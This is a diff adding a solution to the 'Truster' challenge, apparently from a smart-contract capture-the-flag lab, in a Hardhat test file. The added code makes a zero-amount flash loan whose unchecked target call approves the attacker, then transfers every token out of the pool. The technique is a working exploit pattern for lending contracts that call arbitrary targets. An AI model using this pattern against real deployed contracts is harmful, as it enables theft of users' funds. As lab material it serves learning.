@@ -29,6 +29,20 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        //flashLoan没有验证target可以执行任意外包合约
+        const targetData = this.token.interface.encodeFunctionData("approve", [
+            attacker.address,
+            TOKENS_IN_POOL,
+          ]);
+          await this.pool.connect(attacker).flashLoan(
+            0,
+            attacker.address,
+            this.token.address,
+            targetData
+          );
+          this.token
+            .connect(attacker)
+            .transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);        
     });
 
     after(async function () {
